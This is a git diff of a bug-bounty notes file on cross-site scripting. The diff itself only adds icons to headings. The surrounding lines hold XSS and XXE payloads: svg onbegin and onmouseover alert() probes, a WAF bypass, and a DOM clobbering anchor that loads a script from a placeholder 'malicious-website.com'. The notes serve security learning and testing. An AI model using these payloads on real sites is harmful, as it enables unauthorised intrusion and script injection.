@@ -1,6 +1,6 @@
 # Xss
 
-<img src="[https://your-image-url.type](https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png)" width="50" height="50"> ## Theory
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Theory
 
 ### types
 #### Stored (Persistent) 
@@ -32,7 +32,7 @@ jQuery library functions that write to DOM objects are:
 
 ------------------------------------------
 
-## xss bypass
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> xss bypass
 ### innerHTML 
 The innerHTML function does not allow the use of the <script> tags within it as a security feature
 ```javascript
@@ -60,8 +60,9 @@ Use a deprecated B2B interface that was not properly shut down. XML external ent
  <lastName>&xxe;</lastName>
 </userInfo>
 ```
+--------------------------------------------
 
-## Tags bruteforcing
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Tags bruteforcing
 - [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
 - [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
@@ -80,20 +81,20 @@ Searching for allowed tags to be inserted in the search field as parameter
 %3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
 ```
 
-## Waf bypass with anchor
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Waf bypass with anchor
 - [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
 ```
 onmouseover=alert(document.location.has.substring(1))#payloadhere
 ```
 
-## DOM XSS
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> DOM XSS
 ```
  <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
  src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&
  auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
  ```
 
-##  Exploiting DOM clobbering to enable XSS
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50">  Exploiting DOM clobbering to enable XSS
 - [Two solutions for the January 2021 Initigriti XSS Challenge]([https://www.youtube.com/watch?v=Wbovgw3Qxxc](https://youtu.be/Wbovgw3Qxxc?t=912))
 - [portswigger/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
 - [portswigger/dom-based/Advanced-dom-clobbering](https://portswigger.net/research/dom-clobbering-strikes-back)
@@ -112,7 +113,7 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
   - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
 
 
-## Videos:
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Videos:
 - xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
   - filtering and sanitazation come frontend back end.
   - Always test that frontend and backend are sanitized.
